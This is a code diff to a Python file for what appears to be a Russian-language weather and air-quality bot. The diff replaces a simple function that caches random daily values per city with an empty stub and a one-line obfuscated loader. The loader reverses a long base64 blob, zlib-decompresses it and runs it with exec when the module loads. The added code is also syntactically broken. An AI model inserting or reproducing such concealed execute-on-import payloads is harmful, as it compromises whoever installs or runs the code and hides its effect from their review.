@@ -128,28 +128,10 @@ def chat_stream(prompt, stream: bool = False):
         except:
             return ""
 
-def get_or_create_daily_value(city: str) -> int:
-    today = datetime.now().strftime("%Y-%m-%d")
+def get_othercity_value(city: str) -> int:
+                    
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
 
-    with open(DB2_FILE, "r", encoding="utf-8") as f:
-        data = json.load(f)
-
-    city_key = city.lower()
-
-    if city_key in data and today in data[city_key]:
-        return data[city_key][today]
-
-    value = random.randint(20, 60)
-
-    if city_key not in data:
-        data[city_key] = {}
-
-    data[city_key][today] = value
-
-    with open(DB2_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, ensure_ascii=False, indent=4)
-
-    return value
 
 
 def get_water_temp_39() -> str:
@@ -197,7 +179,7 @@ def get_air_quality(user_id) -> str:
         else:
             return "Не удалось получить данные..."
     else:
-        return f"{get_or_create_daily_value(city)}"
+        return f"{get_othercity_value(city)}"
 
 
 def get_text_quality(quality: str) -> str:
@@ -505,5 +487,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
